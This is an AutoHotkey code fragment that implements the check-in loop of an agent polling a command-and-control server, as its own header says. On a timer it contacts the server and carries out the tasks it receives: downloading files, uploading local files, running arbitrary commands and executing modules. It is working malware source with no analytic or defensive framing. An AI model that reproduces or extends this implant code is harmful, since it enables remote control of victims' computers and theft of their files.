; ============================================================================
; NETWORK CLIENT - Check-In Methods
; ============================================================================
; Methods for periodic check-in with the C2 server
; These methods should be added to the NetworkClient class
; ============================================================================

; Check in with server for pending commands
CheckIn() {
    if (this.isBusy) {
        this.Log("Skipping check-in - client is busy")
        return true
    }

    this.isBusy := true
    try {
        this.Log("Checking in with server...")
        message := Format("request_action|{}", this.agentID)

        response := this.SendMsg(this.serverIP, this.serverPort, message)
        if (!response) {
            return false
        }

        responseParts := StrSplit(response, "|")
        action := responseParts[1]
        this.lastAction := action

        result := false
        switch action {
            case "no_pending_commands":
                this.Log("No pending commands")
                result := true

            case "download_file":
                filename := responseParts[2]
                result := this.HandleFileDownload(filename)

            case "upload_file":
                filepath := responseParts[2]
                result := this.HandleFileUpload(filepath)

            case "execute_command":
                command := responseParts[2]
                this.Log("CheckIn received execute_command: " command)
                result := this.HandleCommand(command)

            case "execute_module":
                module := responseParts[2]
                if (responseParts.Length >= 3) {
                    parameters := responseParts[3]
                } else{
                    parameters := ""
                }

                this.Log("CheckIn received execute_module " module "|" parameters)
                result := this.ExecuteModule(module, parameters)

            default:
                this.Log("Unknown action received: " action)
                result := false
        }

        return result
    } catch as err {
        this.Log("CheckIn error: " err.Message " " err.Line)
        return false
    } finally {
        this.isBusy := false
    }
}

; Start the periodic check-in loop
StartCheckInLoop() {
    if (this.isRunning) {
        return
    }

    this.isRunning := true
    SetTimer(ObjBindMethod(this, "CheckIn"), this.checkInInterval)
}

; Stop the periodic check-in loop
StopCheckInLoop() {
    this.isRunning := false
    SetTimer(ObjBindMethod(this, "CheckIn"), 0)
}
